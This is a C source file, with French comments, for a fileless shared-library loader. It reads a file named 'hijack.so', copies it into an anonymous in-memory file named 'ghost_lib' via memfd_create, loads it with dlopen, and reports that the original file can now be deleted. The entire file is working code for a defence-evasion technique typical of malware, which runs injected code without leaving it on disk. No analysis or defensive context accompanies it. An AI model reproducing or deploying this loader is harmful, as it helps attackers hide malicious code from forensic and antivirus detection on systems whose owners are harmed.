#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>

/**
 * Charge une bibliothèque partagée en mémoire sans qu'elle ne touche le disque.
 * @param buffer: Pointeur vers les octets du binaire .so
 * @param size: Taille du binaire
 */
void* load_fileless(unsigned char *buffer, size_t size) {
    int fd;
    void *handle;
    char fd_path[64];

    fd = memfd_create("ghost_lib", MFD_CLOEXEC);
    if (fd == -1) {
        perror("memfd_create");
        return NULL;
    }
    if (write(fd, buffer, size) != (ssize_t)size) {
        perror("write");
        close(fd);
        return NULL;
    }
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    handle = dlopen(fd_path, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "dlopen failed: %s\n", dlerror());
    }
    close(fd);
    return handle;
}

int main(int argc, char **argv) {
    int file_fd = open("hijack.so", O_RDONLY);
    if (file_fd == -1) return 1;
    size_t size = lseek(file_fd, 0, SEEK_END);
    lseek(file_fd, 0, SEEK_SET);
    unsigned char *buffer = malloc(size);
    read(file_fd, buffer, size);
    close(file_fd);
    void *handle = load_fileless(buffer, size);
    if (handle) {
        printf("[+] Bibliothèque chargée en mémoire. Fichier initial supprimable.\n");
    }
    free(buffer);
    return 0;
}